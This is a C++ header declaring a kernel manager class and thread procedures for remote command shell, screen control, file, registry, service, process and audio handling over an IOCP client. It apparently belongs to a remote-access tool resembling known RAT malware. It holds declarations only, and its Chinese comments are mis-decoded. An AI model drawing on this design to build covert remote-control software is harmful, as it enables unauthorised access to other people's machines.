#pragma once

#include "Common.h"
#include "dllmain.h"
#include "Manager.h"
#include "InstantMessageManager.h"
#include "Systemhelper.h"	
#include "Processhelper.h"
#include "ProcessManager.h"
#include "CmdManager.h"
#include "WindowManager.h"
#include "RemoteController.h"
#include "FileManager.h"
#include "RegisterManager.h"
#include "ServiceManager.h"
#include "AudioManager.h"
class CKernelManager : public CManager
{										
public:	 
	CKernelManager(CIocpClient* IocpClient);
	~CKernelManager();
	void HandleIo(PBYTE BufferData, ULONG_PTR BufferLength);
private:

	HANDLE m_ThreadHandle[0x1000];
	int    m_ThreadHandleCount;

};

DWORD WINAPI RemoteMessageProcedure(LPVOID ParameterData);
DWORD WINAPI ProcessManagerProcedure(LPVOID ParameterData);
DWORD WINAPI CmdManagerProcedure(LPVOID ParameterData);
DWORD WINAPI WindowManagerProcedure(LPVOID ParameterData);
DWORD WINAPI RemoteControllerProcedure(LPVOID ParameterData);
DWORD WINAPI FileManagerProcedure(LPVOID ParameterData);
DWORD WINAPI RegisterManagerProcedure(LPVOID ParameterData);		//ע�������
DWORD WINAPI ServiceManagerProcedure(LPVOID ParameterData);			//�������
DWORD WINAPI AudioManagerProcedure(LPVOID ParameterData);			//��Ƶ����